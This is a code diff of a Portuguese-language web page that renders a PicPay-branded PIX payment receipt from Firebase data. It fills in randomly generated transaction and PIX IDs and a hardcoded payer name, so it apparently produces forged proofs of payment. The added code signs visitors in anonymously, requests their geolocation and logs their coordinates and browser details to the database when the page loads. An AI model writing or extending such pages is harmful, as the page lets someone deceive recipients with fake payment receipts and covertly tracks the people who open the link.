@@ -24,12 +24,24 @@
       padding: 20px;
     }
     
-    h1 {
-      font-size: 18px;
-      color: #333;
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 10px;
       margin-bottom: 15px;
       padding-bottom: 10px;
       border-bottom: 1px solid #eee;
+    }
+    
+    .header h1 {
+      font-size: 18px;
+      color: #333;
+      margin: 0;
+    }
+    
+    .pix-icon {
+      width: 30px;
+      height: 30px;
     }
     
     .info-section {
@@ -96,6 +108,14 @@
       padding: 20px;
       color: #666;
     }
+    
+    .location-info {
+      font-size: 12px;
+      color: #888;
+      text-align: center;
+      margin-top: 10px;
+      font-style: italic;
+    }
   </style>
 </head>
 <body>
@@ -106,6 +126,7 @@
   <!-- Firebase SDK -->
   <script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-database-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.9.0/firebase-auth-compat.js"></script>
 
   <script>
     // Configuração do Firebase
@@ -123,6 +144,7 @@
     // Inicializar Firebase
     const app = firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
+    const auth = firebase.auth();
 
     // Função para formatar a data no padrão brasileiro
     function formatarData(dataISO) {
@@ -147,92 +169,107 @@
       return Math.floor(1000000000 + Math.random() * 9000000000);
     }
 
+    // Função para registrar acesso com geolocalização
+    function registrarAcesso(latitude, longitude) {
+      const dadosAcesso = {
+        dataHora: new Date().toISOString(),
+        userAgent: navigator.userAgent,
+        latitude: latitude,
+        longitude: longitude
+      };
+
+      database.ref("acessos").push(dadosAcesso)
+        .then(() => console.log("Acesso registrado com sucesso"))
+        .catch(error => console.error("Erro ao registrar acesso:", error));
+    }
+
     // Função para buscar e exibir os dados do comprovante
     function carregarComprovante() {
-      const comprovanteRef = database.ref("comprovantes/-OO4AxQ8SrsI057BUYfs");
+      const comprovantesRef = database.ref("comprovantes").orderByKey().limitToLast(1);
       
-      comprovanteRef.once('value').then((snapshot) => {
-        const dados = snapshot.val();
-        
-        if (dados) {
-          // Formatar a data e hora
-          const dataFormatada = formatarData(dados.data);
-          const dataHoraAtual = new Date();
-          const horaFormatada = formatarHora(dataHoraAtual);
-          
-          // Gerar IDs aleatórios para o comprovante
-          const idTransacao = gerarIdTransacao();
-          const idPix = `E${Math.random().toString(36).substring(2, 15)}${dataHoraAtual.getFullYear()}${String(dataHoraAtual.getMonth() + 1).padStart(2, '0')}${String(dataHoraAtual.getDate()).padStart(2, '0')}${String(dataHoraAtual.getHours()).padStart(2, '0')}${String(dataHoraAtual.getMinutes()).padStart(2, '0')}`;
-          
-          // Criar o HTML do comprovante
-          document.getElementById("comprovante").innerHTML = `
-            <h1>Pagamento via PIX</h1>
+      comprovantesRef.once('value').then((snapshot) => {
+        if (snapshot.exists()) {
+          snapshot.forEach((childSnapshot) => {
+            const dados = childSnapshot.val();
             
-            <div class="info-line"><span class="info-label">Transação:</span> ${idTransacao}</div>
-            <div class="info-line"><span class="info-label">${dataFormatada} às ${horaFormatada}</span></div>
+            // Formatar a data e hora
+            const dataFormatada = formatarData(dados.data);
+            const dataHoraAtual = new Date();
+            const horaFormatada = formatarHora(dataHoraAtual);
             
-            <div class="divider"></div>
+            // Gerar IDs aleatórios para o comprovante
+            const idTransacao = gerarIdTransacao();
+            const idPix = `E${Math.random().toString(36).substring(2, 15)}${dataHoraAtual.getFullYear()}${String(dataHoraAtual.getMonth() + 1).padStart(2, '0')}${String(dataHoraAtual.getDate()).padStart(2, '0')}${String(dataHoraAtual.getHours()).padStart(2, '0')}${String(dataHoraAtual.getMinutes()).padStart(2, '0')}`;
             
-           <div class="info-section">
-  <h2>Destinatário</h2>
-  <div class="info-line">${dados.destinatario}</div>
-  ${dados.documentType && dados.documentNumber ?
-    (dados.documentType === 'CPF' ?
-      `<div class="info-line">CPF: ${dados.documentNumber}</div>` :
-      `<div class="info-line">CNPJ: ${dados.documentNumber}</div>`
-    ) :
-    (dados.documentType === 'CPF' ?
-      `<div class="info-line">CPF: ***.***.***-**</div>` :
-      `<div class="info-line">CNPJ: **.***.***/****-**</div>`
-    )
-  }
-  <div class="info-line">Instituição: ${dados.banco}</div>
-</div>
-            
-            <div class="info-section">
-              <h2>Dados do pagador</h2>
-              <div class="info-line">KEROLYN DA SILVA LIMA</div>
-              <div class="info-line">CPF: ***.075.070-**</div>
-              <div class="info-line">Instituição: PICPAY</div>
-            </div>
-            
-            <div class="info-section">
-              <h2>Dados do devedor</h2>
-            </div>
-            
-            <div class="info-section">
-              <h2>Dados gerais</h2>
-              <div class="info-line"><span class="info-label">Valor Original:</span> ${dados.valor}</div>
-              <div class="info-line"><span class="info-label">Identificador:</span> 1VhgoffyPnnj0co768EA1unONIVficpo</div>
-            </div>
-            
-            <div class="info-section">
-              <h2>ID Pix</h2>
-              <div class="info-line">${idPix}</div>
-            </div>
-            
-            <table class="valor-table">
-              <tr>
-                <td>Pagamento</td>
-                <td>Saldo</td>
-              </tr>
-              <tr class="valor-total">
-                <td>Total pago</td>
-                <td>${dados.valor}</td>
-              </tr>
-            </table>
-            
-            <div class="divider"></div>
-            
-            <div class="footer">Dúvidas? Acesse a nossa Central de Ajuda</div>
-            
-            <div class="divider"></div>
-            
-            <div class="cnpj">PicPay<br>CNPJ 22.896.431/0001-10</div>
-          `;
+            // Criar o HTML do comprovante com o ícone PIX
+            document.getElementById("comprovante").innerHTML = `
+              <div class="header">
+                <img src="https://logopng.com.br/logos/pix-106.png" alt="PIX" class="pix-icon">
+                <h1>Pagamento via PIX</h1>
+              </div>
+              
+              <div class="info-line"><span class="info-label">Transação:</span> ${idTransacao}</div>
+              <div class="info-line"><span class="info-label">${dataFormatada} às ${horaFormatada}</span></div>
+              
+              <div class="divider"></div>
+              
+              <div class="info-section">
+                <h2>Destinatário</h2>
+                <div class="info-line">${dados.destinatario}</div>
+                ${dados.documentType === 'CPF' ? 
+                  `<div class="info-line">CPF: ${dados.documentNumber || '***.***.***-**'}</div>` : 
+                  `<div class="info-line">CNPJ: ${dados.documentNumber || '**.***.***/****-**'}</div>`
+                }
+                <div class="info-line">Instituição: ${dados.banco}</div>
+              </div>
+              
+              <div class="info-section">
+                <h2>Dados do pagador</h2>
+                <div class="info-line">KEROLYN DA SILVA LIMA</div>
+                <div class="info-line">CPF: ***.075.070-**</div>
+                <div class="info-line">Instituição: PICPAY</div>
+              </div>
+              
+              <div class="info-section">
+                <h2>Dados do devedor</h2>
+              </div>
+              
+              <div class="info-section">
+                <h2>Dados gerais</h2>
+                <div class="info-line"><span class="info-label">Valor Original:</span> ${dados.valor}</div>
+                <div class="info-line"><span class="info-label">Identificador:</span> 1VhgoffyPnnj0co768EA1unONIVficpo</div>
+              </div>
+              
+              <div class="info-section">
+                <h2>ID Pix</h2>
+                <div class="info-line">${idPix}</div>
+              </div>
+              
+              <table class="valor-table">
+                <tr>
+                  <td>Pagamento</td>
+                  <td>Saldo</td>
+                </tr>
+                <tr class="valor-total">
+                  <td>Total pago</td>
+                  <td>${dados.valor}</td>
+                </tr>
+              </table>
+              
+              <div class="divider"></div>
+              
+              <div class="footer">Dúvidas? Acesse a nossa Central de Ajuda</div>
+              
+              <div class="divider"></div>
+              
+              <div class="cnpj">PicPay<br>CNPJ 22.896.431/0001-10</div>
+              
+              <div class="location-info">Localização registrada para segurança</div>
+            `;
+          });
         } else {
           document.getElementById("comprovante").innerHTML = `
-            <div class="loading">Comprovante não encontrado</div>
+            <div class="loading">Nenhum comprovante encontrado</div>
           `;
         }
       }).catch((error) => {
@@ -242,8 +279,41 @@
       });
     }
 
-    // Carregar o comprovante quando a página estiver pronta
-    document.addEventListener('DOMContentLoaded', carregarComprovante);
+    // Função principal que inicia o processo
+    function iniciar() {
+      // Autenticação anônima no Firebase
+      auth.signInAnonymously()
+        .then(() => {
+          // Primeiro tenta obter a localização
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              (position) => {
+                // Se conseguir a localização, registra o acesso
+                registrarAcesso(position.coords.latitude, position.coords.longitude);
+                // Depois carrega o comprovante
+                carregarComprovante();
+              },
+              (error) => {
+                // Se não conseguir a localização, registra sem coordenadas
+                console.error("Erro ao obter localização:", error);
+                registrarAcesso(null, null);
+                carregarComprovante();
+              }
+            );
+          } else {
+            // Navegador não suporta geolocalização
+            registrarAcesso(null, null);
+            carregarComprovante();
+          }
+        })
+        .catch((error) => {
+          console.error("Erro na autenticação:", error);
+          carregarComprovante();
+        });
+    }
+
+    // Iniciar o processo quando a página carregar
+    document.addEventListener('DOMContentLoaded', iniciar);
   </script>
 </body>
 </html>
